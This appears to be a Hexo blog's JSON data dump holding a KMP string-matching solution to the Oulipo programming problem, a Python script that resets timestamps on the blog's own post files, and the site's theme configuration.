: stir son tapis, assaillant à tout instant son imagination, l’intuition d’un tabou, la vision d’un mal obscur, d’un quoi vacant, d’un non-dit : la vision, l’avision d’un oubli commandant tout, où s’abolissait la raison : tout avait l’air normal mais…</p>\n<p>Perec would probably have scored high (or rather, low) in the following contest. People are asked to write a perhaps even meaningful text on some subject with as few occurrences of a given “word” as possible. Our task is to provide the jury with a program that counts these occurrences, in order to obtain a ranking of the competitors. These competitors often write very long texts with nonsense meaning; a sequence of 500,000 consecutive ‘T’s is not unusual. And they never use spaces.</p>\n<p>So we want to quickly find out how often a word, i.e., a given string, occurs in a text. More formally: given the alphabet {‘A’, ‘B’, ‘C’, …, ‘Z’} and two finite strings over that alphabet, a word W and a text T, count the number of occurrences of W in T. All the consecutive characters of W must exactly match consecutive characters of T. Occurrences may overlap.</p>\n</blockquote>\n<a id=\"more\"></a>\n<h1 id=\"Input\"><a href=\"#Input\" class=\"headerlink\" title=\"Input\"></a>Input</h1><blockquote><p>The first line of the input file contains a single number: the number of test cases to follow. Each test case has the following format:</p>\n<p>One line with the word W, a string over {‘A’, ‘B’, ‘C’, …, ‘Z’}, with 1 ≤ |W| ≤ 10,000 (here |W| denotes the length of the string W).<br>One line with the text T, a string over {‘A’, ‘B’, ‘C’, …, ‘Z’}, with |W| ≤ |T| ≤ 1,000,000.</p>\n</blockquote>\n<h1 id=\"Output\"><a href=\"#Output\" class=\"headerlink\" title=\"Output\"></a>Output</h1><blockquote><p>For every test case in the input file, the output should contain a single number, on a single line: the number of occurrences of the word W in the text T.</p>\n</blockquote>\n<h1 id=\"Sample-Input\"><a href=\"#Sample-Input\" class=\"headerlink\" title=\"Sample Input\"></a>Sample Input</h1><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">3</span><br><span class=\"line\">BAPC</span><br><span class=\"line\">BAPC</span><br><span class=\"line\">AZA</span><br><span class=\"line\">AZAZAZA</span><br><span class=\"line\">VERDI</span><br><span class=\"line\">AVERDXIVYERDIAN</span><br></pre></td></tr></table></figure>\n<h1 id=\"Sample-Output\"><a href=\"#Sample-Output\" class=\"headerlink\" title=\"Sample Output\"></a>Sample Output</h1><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1</span><br><span class=\"line\">3</span><br><span class=\"line\">0</span><br></pre></td></tr></table></figure>\n<h1 id=\"Code\"><a href=\"#Code\" class=\"headerlink\" title=\"Code\"></a>Code</h1><figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;iostream&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;string&gt;</span></span></span><br><span class=\"line\"><span class=\"keyword\">using</span> <span class=\"keyword\">namespace</span> <span class=\"built_in\">std</span>;</span><br><span class=\"line\"><span class=\"built_in\">string</span> a,b;</span><br><span class=\"line\"><span class=\"keyword\">int</span> NEXT[<span class=\"number\">10020</span>];</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">get</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> i=<span class=\"number\">0</span>,j=<span class=\"number\">-1</span>;</span><br><span class=\"line\">    NEXT[i]=j;</span><br><span class=\"line\">    <span class=\"keyword\">while</span>(i&lt;b.length())&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(j==<span class=\"number\">-1</span>||b[i]==b[j])&#123;</span><br><span class=\"line\">            i++;j++;</span><br><span class=\"line\">            NEXT[i]=j;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">else</span> j=NEXT[j];</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">kmp</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    get();</span><br><span class=\"line\">    <span class=\"keyword\">int</span> i=<span class=\"number\">0</span>,j=<span class=\"number\">0</span>,ans=<span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"keyword\">while</span>(i&lt;a.length())</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(j==<span class=\"number\">-1</span>||a[i]==b[j])</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            i++;j++;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">else</span> j=NEXT[j];</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(j==b.length())</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            ans++;</span><br><span class=\"line\">            j=NEXT[j];</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> ans;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    ios::sync_with_stdio(<span class=\"literal\">false</span>);</span><br><span class=\"line\">    <span class=\"keyword\">int</span> T;</span><br><span class=\"line\">    <span class=\"built_in\">cin</span>&gt;&gt;T;</span><br><span class=\"line\">    <span class=\"keyword\">while</span>(T--)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"built_in\">cin</span>&gt;&gt;b&gt;&gt;a;</span><br><span class=\"line\">        <span class=\"built_in\">cout</span>&lt;&lt;kmp()&lt;&lt;<span class=\"built_in\">endl</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n","site":{"data":{"sidebar":"<script src=\"//v1.hitokoto.cn/?encode=js&select=%23hitokoto\" defer></script>\n<style>\n@media all and (orientation : portrait) {\n\t#hitokoto{\n\t\tpadding-left: 50px;\n\t\tpadding-right: 50px;\n\t}\n}\n</style>\n\n\n\n\n\n\n\n\n","next":{"override":false,"reminder":false,"cache":{"enable":true},"minify":true,"custom_file_path":{"sidebar":"source/_data/sidebar.swig"},"favicon":{"small":"//cdn.file.todest.cn/blog/user/logo.ico","medium":"//cdn.file.todest.cn/blog/user/logo.ico","apple_touch_icon":"//cdn.file.todest.cn/blog/user/logo.ico","safari_pinned_tab":"//cdn.file.todest.cn/blog/user/logo.ico","ms_browserconfig":"//cdn.file.todest.cn/blog/user/logo.ico"},"rss":null,"footer":{"icon":{"name":"user","animated":false,"color":"#808080"},"copyright":null,"powered":{"enable":true,"version":true},"theme":{"enable":true,"version":true},"beian":{"enable":false,"icp":null,"gongan_id":null,"gongan_num":null,"gongan_icon_url":null}},"creative_commons":{"license":"by-nc-sa","sidebar":false,"post":false,"language":null},"scheme":"Gemini","menu":{"home":"/ || home","about":"/about/ || user","tags":"/tags/ || tags","categories":"/categories/ || th","archives":"/archives/ || archive","相册":"/photo/ || photo","链接":"/links/ || link","留言":"/bbs/ || comments"},"menu_settings":{"icons":true,"badges":true},"sidebar":{"position":"left","display":"post","offset":12,"onmobile":false},"avatar":{"url":"https://s.gravatar.com/avatar/4756cb352ec7f58884fdc0c219ea00dc?s=80","rounded":false,"rotated":false},"site_state":true,"social":{"GitHub":"https://github.com/todest || github","E-Mail":"mailto:todest@qq.com || envelope","QQ":"http://wpa.qq.com/msgrd?v=3&uin=1123792492 || qq","Facebook":"https://www.facebook.com/ultrasurreal || facebook","StackOverflow":"https://stackoverflow.com/users/11422695 || stack-overflow","Instagram":"https://www.instagram.com/yonghangguo/ || instagram"},"social_icons":{"enable":true,"icons_only":true,"transition":true},"links_settings":{"icon":"link","title":"Links","layout":"inline"},"links":{"BoilTask":"https://boiltask.com","Codancer":"https://www.cnblogs.com/codancer","Colsrch":"https://colsrch.cn","执念":"https://blog.wzy1999.wang","Des_tiny":"https://anyway521.github.io","Drew":"https://cndrew.cn","rookie6":"https://rookie6.github.io","LuoZui":"https://www.lzphi.cn","Sky":"https://angelni.github.io","一Wa哇一天":"https://blogzhy.cn","Jinqimu":"https://jinqimu.xyz","FuZhiyuan":"https://fuzhiyuan.github.io","RuiRui":"https://pipakacha.com"},"toc":{"enable":true,"number":true,"wrap":false,"expand_all":false,"max_depth":6},"chat":{"enable":false,"icon":"comment","text":"Chat"},"excerpt_description":true,"auto_excerpt":{"enable":false,"length":150},"read_more_btn":true,"post_meta":{"item_text":true,"created_at":true,"updated_at":{"enable":true,"another_day":true},"categories":true},"symbols_count_time":{"separated_meta":true,"item_text_post":true,"item_text_total":false,"awl":4,"wpm":275},"tag_icon":false,"reward_settings":{"enable":true,"animation":true,"comment":"赏点呗！"},"reward":{"wechatpay":"//cdn.file.todest.cn/blog/user/wechatpay.jpg","alipay":"//cdn.file.todest.cn/blog/user/alipay.jpg","bitcoin":"//cdn.file.todest.cn/blog/user/bitcoin.png"},"related_posts":{"enable":false,"title":null,"display_in_home":false,"params":{"maxCount":5}},"post_edit":{"enable":false,"url":"https://github.com/user-name/repo-name/tree/branch-name/subdirectory-name"},"cheers":true,"tagcloud":{"min":12,"max":30,"start":"#ccc","end":"#111","amount":200},"calendar":{"calendar_id":"<required>","api_key":"<required>","orderBy":"startTime","offsetMax":24,"offsetMin":4,"showDeleted":false,"singleEvents":true,"maxResults":250},"text_align":{"desktop":"justify","mobile":"justify"},"mobile_layout_economy":false,"android_chrome_color":"#222","safari_rainbow":false,"custom_logo":null,"codeblock":{"highlight_theme":"normal","copy_button":{"enable":true,"show_result":true,"style":null}},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"reading_progress":{"enable":false,"position":"top","color":"#37c6c0","height":"3px"},"bookmark":{"enable":false,"color":"#222","save":"auto"},"github_banner":{"enable":true,"permalink":"https://github.com/yourname","title":"Follow me on GitHub"},"font":{"enable":false,"host":null,"global":{"external":true,"family":"Lato","size":null},"title":{"external":true,"family":null,"size":null},"headings":{"external":true,"family":null,"size":null},"posts":{"external":true,"family":null},"codes":{"external":true,"family":null}},"disable_baidu_transformation":false,"canonical":true,"seo":true,"index_with_subtitle":false,"exturl":false,"google_site_verification":null,"bing_site_verification":null,"yandex_site_verification":null,"baidu_site_verification":null,"baidu_push":false,"math":{"per_page":false,"mathjax":{"enable":true,"mhchem":false},"katex":{"enable":false,"copy_tex":false}},"pjax":false,"fancybox":true,"mediumzoom":false,"lazyload":true,"pangu":false,"quicklink":{"enable":false,"home":true,"archive":true,"delay":true,"timeout":3000,"priority":true,"ignores":null},"comments":{"style":"tabs","active":null,"storage":true,"nav":null},"disqus":{"enable":false,"shortname":null,"count":true,"lazyload":false},"disqusjs":{"enable":false,"api":null,"apikey":null,"shortname":null},"changyan":{"enable":false,"appid":null,"appkey":null},"valine":{"enable":true,"appid":"NNOFYEbCjmMJUqInK2zEpetd-gzGzoHsz","appkey":"Q474k3XvUzlPbRG5bOyNCxVt","notify":false,"verify":false,"placeholder":"写点什么？","avatar":"mm","guest_info":"nick,mail,link","pageSize":10,"language":null,"visitor":false,"comment_count":true,"recordIP":false,"serverURLs":null},"livere_uid":null,"gitalk":{"enable":false,"github_id":null,"repo":null,"client_id":null,"client_secret":null,"admin_user":null,"distraction_free_mode":true,"language":null},"rating":{"enable":false,"id":null,"color":"fc6423"},"add_this_id":null,"google_analytics":{"tracking_id":null,"localhost_ignored":true,"only_pageview":false},"baidu_analytics":null,"growingio_analytics":null,"cnzz_siteid":null,"tencent_analytics":null,"tencent_mta":null,"leancloud_visitors":{"enable":false,"app_id":null,"app_key":null,"security":true,"betterPerformance":false},"firestore":{"enable":false,"collection":"articles","apiKey":null,"projectId":null},"busuanzi_count":{"enable":true,"total_visitors":true,"total_visitors_icon":"user","total_views":true,"total_views_icon":"eye","post_views":true,"post_views_icon":"eye"},"algolia_search":{"enable":false,"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"local_search":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":true,"preload":true},"swiftype_key":null,"chatra":{"enable":false,"async":true,"id":null},"tidio":{"enable":false,"key":null},"note":{"style":"simple","icons":false,"border_radius":3,"light_bg_offset":0},"tabs":{"transition":{"tabs":false,"labels":true},"border_radius":0},"pdf":{"enable":false,"height":"500px"},"mermaid":{"enable":false,"theme":"forest"},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"pace":{"enable":false,"theme":"minimal"},"three":{"enable":false,"three_waves":false,"canvas_lines":false,"canvas_sphere":false},"canvas_nest":{"enable":false,"onmobile":true,"color":"0,0,255","opacity":0.5,"zIndex":-1,"count":99},"canvas_ribbon":{"enable":false,"size":300,"alpha":0.6,"zIndex":-1},"vendors":{"_internal":"lib","anime":null,"fontawesome":null,"mathjax":null,"mhchem":null,"katex":null,"copy_tex_js":null,"copy_tex_css":null,"pjax":null,"jquery":null,"fancybox":null,"fancybox_css":null,"mediumzoom":null,"lazyload":null,"pangu":null,"quicklink":null,"disqusjs_js":null,"disqusjs_css":null,"valine":null,"gitalk_js":null,"gitalk_css":null,"algolia_instant_js":null,"algolia_instant_css":null,"pdfobject":null,"mermaid":null,"velocity":null,"velocity_ui":null,"pace":null,"pace_css":null,"three":null,"three_waves":null,"canvas_lines":null,"canvas_sphere":null,"canvas_nest":null,"canvas_nest_nomobile":null,"canvas_ribbon":null},"css":"css","js":"js","images":"images","crash_cheat":true,"clicklove":true,"snow":false}}},"length":2388,"excerpt":"<h1 id=\"Description\"><a href=\"#Description\" class=\"headerlink\" title=\"Description\"></a>Description</h1><blockquote><p>The French author Georges Perec (1936–1982) once wrote a book, La disparition, without the letter ‘e’. He was a member of the Oulipo group. A quote from the book:</p>\n<p>Tout avait Pair normal, mais tout s’affirmait faux. Tout avait Fair normal, d’abord, puis surgissait l’inhumain, l’affolant. Il aurait voulu savoir où s’articulait l’association qui l’unissait au roman : stir son tapis, assaillant à tout instant son imagination, l’intuition d’un tabou, la vision d’un mal obscur, d’un quoi vacant, d’un non-dit : la vision, l’avision d’un oubli commandant tout, où s’abolissait la raison : tout avait l’air normal mais…</p>\n<p>Perec would probably have scored high (or rather, low) in the following contest. People are asked to write a perhaps even meaningful text on some subject with as few occurrences of a given “word” as possible. Our task is to provide the jury with a program that counts these occurrences, in order to obtain a ranking of the competitors. These competitors often write very long texts with nonsense meaning; a sequence of 500,000 consecutive ‘T’s is not unusual. And they never use spaces.</p>\n<p>So we want to quickly find out how often a word, i.e., a given string, occurs in a text. More formally: given the alphabet {‘A’, ‘B’, ‘C’, …, ‘Z’} and two finite strings over that alphabet, a word W and a text T, count the number of occurrences of W in T. All the consecutive characters of W must exactly match consecutive characters of T. Occurrences may overlap.</p>\n</blockquote>","more":"<h1 id=\"Input\"><a href=\"#Input\" class=\"headerlink\" title=\"Input\"></a>Input</h1><blockquote><p>The first line of the input file contains a single number: the number of test cases to follow. Each test case has the following format:</p>\n<p>One line with the word W, a string over {‘A’, ‘B’, ‘C’, …, ‘Z’}, with 1 ≤ |W| ≤ 10,000 (here |W| denotes the length of the string W).<br>One line with the text T, a string over {‘A’, ‘B’, ‘C’, …, ‘Z’}, with |W| ≤ |T| ≤ 1,000,000.</p>\n</blockquote>\n<h1 id=\"Output\"><a href=\"#Output\" class=\"headerlink\" title=\"Output\"></a>Output</h1><blockquote><p>For every test case in the input file, the output should contain a single number, on a single line: the number of occurrences of the word W in the text T.</p>\n</blockquote>\n<h1 id=\"Sample-Input\"><a href=\"#Sample-Input\" class=\"headerlink\" title=\"Sample Input\"></a>Sample Input</h1><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">3</span><br><span class=\"line\">BAPC</span><br><span class=\"line\">BAPC</span><br><span class=\"line\">AZA</span><br><span class=\"line\">AZAZAZA</span><br><span class=\"line\">VERDI</span><br><span class=\"line\">AVERDXIVYERDIAN</span><br></pre></td></tr></table></figure>\n<h1 id=\"Sample-Output\"><a href=\"#Sample-Output\" class=\"headerlink\" title=\"Sample Output\"></a>Sample Output</h1><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1</span><br><span class=\"line\">3</span><br><span class=\"line\">0</span><br></pre></td></tr></table></figure>\n<h1 id=\"Code\"><a href=\"#Code\" class=\"headerlink\" title=\"Code\"></a>Code</h1><figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;iostream&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;string&gt;</span></span></span><br><span class=\"line\"><span class=\"keyword\">using</span> <span class=\"keyword\">namespace</span> <span class=\"built_in\">std</span>;</span><br><span class=\"line\"><span class=\"built_in\">string</span> a,b;</span><br><span class=\"line\"><span class=\"keyword\">int</span> NEXT[<span class=\"number\">10020</span>];</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">get</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> i=<span class=\"number\">0</span>,j=<span class=\"number\">-1</span>;</span><br><span class=\"line\">    NEXT[i]=j;</span><br><span class=\"line\">    <span class=\"keyword\">while</span>(i&lt;b.length())&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(j==<span class=\"number\">-1</span>||b[i]==b[j])&#123;</span><br><span class=\"line\">            i++;j++;</span><br><span class=\"line\">            NEXT[i]=j;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">else</span> j=NEXT[j];</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">kmp</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    get();</span><br><span class=\"line\">    <span class=\"keyword\">int</span> i=<span class=\"number\">0</span>,j=<span class=\"number\">0</span>,ans=<span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"keyword\">while</span>(i&lt;a.length())</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(j==<span class=\"number\">-1</span>||a[i]==b[j])</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            i++;j++;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">else</span> j=NEXT[j];</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(j==b.length())</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            ans++;</span><br><span class=\"line\">            j=NEXT[j];</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> ans;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    ios::sync_with_stdio(<span class=\"literal\">false</span>);</span><br><span class=\"line\">    <span class=\"keyword\">int</span> T;</span><br><span class=\"line\">    <span class=\"built_in\">cin</span>&gt;&gt;T;</span><br><span class=\"line\">    <span class=\"keyword\">while</span>(T--)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"built_in\">cin</span>&gt;&gt;b&gt;&gt;a;</span><br><span class=\"line\">        <span class=\"built_in\">cout</span>&lt;&lt;kmp()&lt;&lt;<span class=\"built_in\">endl</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>"},{"title":"Python修改文件时间","abbrlink":"56e638c7","date":"2020-04-08T10:34:05.000Z","_content":"```py\nimport os\nimport time\nfrom datetime import datetime\nfrom win32file import CreateFile, SetFileTime, GetFileTime, CloseHandle\nfrom win32file import GENERIC_READ, GENERIC_WRITE, OPEN_EXISTING\nfrom pywintypes import Time\t#忽略此处报错，不影响运行\n\n\ndef modifyFileTime(filePath, createTime, modifyTime, accessTime, offset):\n    \"\"\"\n    用来修改任意文件的相关时间属性，时间格式：YYYY-MM-DD HH:MM:SS 例如：2019-02-02 00:01:02\n    :param filePath: 文件路径名\n    :param createTime: 创建时间\n    :param modifyTime: 修改时间\n    :param accessTime: 访问时间\n    :param offset: 时间偏移的秒数,tuple格式，顺序和参数时间对应\n    \"\"\"\n    format = \"%Y-%m-%d %H:%M:%S\"  # 时间格式\n    cTime_t = timeOffsetAndStruct(createTime, format, offset[0])\n    mTime_t = timeOffsetAndStruct(modifyTime, format, offset[1])\n    aTime_t = timeOffsetAndStruct(accessTime, format, offset[2])\n\n    fh = CreateFile(filePath, GENERIC_READ | GENERIC_WRITE, 0, None, OPEN_EXISTING, 0, 0)\n    createTimes, accessTimes, modifyTimes = GetFileTime(fh)\n\n    createTimes = Time(time.mktime(cTime_t))\n    accessTimes = Time(time.mktime(aTime_t))\n    modifyTimes = Time(time.mktime(mTime_t))\n    SetFileTime(fh, createTimes, accessTimes, modifyTimes)\n    CloseHandle(fh)\n\n\ndef timeOffsetAndStruct(times, format, offset):\n    return time.localtime(time.mktime(time.strptime(times, format)) + offset)\n\n\noffset = (0, 1, 2)\nfor root, dirs, files in os.walk('F:\\\\Blog\\\\source\\\\_posts'):\n    for file in files:\n        filepath = root + '\\\\' + file\n\t\t\"\"\"\n\t\t用来获取任意文件的相关时间属性\n\t\t\"\"\"\n        ctime = str(datetime.fromtimestamp(os.path.getctime(filepath)))[:19]\n        mtime = str(datetime.fromtimestamp(os.path.getmtime(filepath)))[:19]\n        atime = str(datetime.fromtimestamp(os.path.getatime(filepath)))[:19]\n        \n\t\tmodifyFileTime(filepath, ctime, mtime, atime, offset)\n\n```\n","source":"_posts/Python修改文件时间.md","raw":"---\ntitle: Python修改文件时间\ncategories:\n  - 编程语言\n  - Python\ntags: Python\nabbrlink: 56e638c7\ndate: 2020-04-08 18:34:05\n---\n```py\nimport os\nimport time\nfrom datetime import datetime\nfrom win32file import CreateFile, SetFileTime, GetFileTime, CloseHandle\nfrom win32file import GENERIC_READ, GENERIC_WRITE, OPEN_EXISTING\nfrom pywintypes import Time\t#忽略此处报错，不影响运行\n\n\ndef modifyFileTime(filePath, createTime, modifyTime, accessTime, offset):\n    \"\"\"\n    用来修改任意文件的相关时间属性，时间格式：YYYY-MM-DD HH:MM:SS 例如：2019-02-02 00:01:02\n    :param filePath: 文件路径名\n    :param createTime: 创建时间\n    :param modifyTime: 修改时间\n    :param accessTime: 访问时间\n    :param offset: 时间偏移的秒数,tuple格式，顺序和参数时间对应\n    \"\"\"\n    format = \"%Y-%m-%d %H:%M:%S\"  # 时间格式\n    cTime_t = timeOffsetAndStruct(createTime, format, offset[0])\n    mTime_t = timeOffsetAndStruct(modifyTime, format, offset[1])\n    aTime_t = timeOffsetAndStruct(accessTime, format, offset[2])\n\n    fh = CreateFile(filePath, GENERIC_READ | GENERIC_WRITE, 0, None, OPEN_EXISTING, 0, 0)\n    createTimes, accessTimes, modifyTimes = GetFileTime(fh)\n\n    createTimes = Time(time.mktime(cTime_t))\n    accessTimes = Time(time.mktime(aTime_t))\n    modifyTimes = Time(time.mktime(mTime_t))\n    SetFileTime(fh, createTimes, accessTimes, modifyTimes)\n    CloseHandle(fh)\n\n\ndef timeOffsetAndStruct(times, format, offset):\n    return time.localtime(time.mktime(time.strptime(times, format)) + offset)\n\n\noffset = (0, 1, 2)\nfor root, dirs, files in os.walk('F:\\\\Blog\\\\source\\\\_posts'):\n    for file in files:\n        filepath = root + '\\\\' + file\n\t\t\"\"\"\n\t\t用来获取任意文件的相关时间属性\n\t\t\"\"\"\n        ctime = str(datetime.fromtimestamp(os.path.getctime(filepath)))[:19]\n        mtime = str(datetime.fromtimestamp(os.path.getmtime(filepath)))[:19]\n        atime = str(datetime.fromtimestamp(os.path.getatime(filepath)))[:19]\n        \n\t\tmodifyFileTime(filepath, ctime, mtime, atime, offset)\n\n```\n","slug":"Python修改文件时间","published":1,"updated":"2020-05-11T09:40:49.778Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckieexkbb001sqse59ush0gf8","content":"<figure class=\"highlight py\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> os</span><br><span class=\"line\"><span class=\"keyword\">import</span> time</span><br><span class=\"line\"><span class=\"keyword\">from</span> 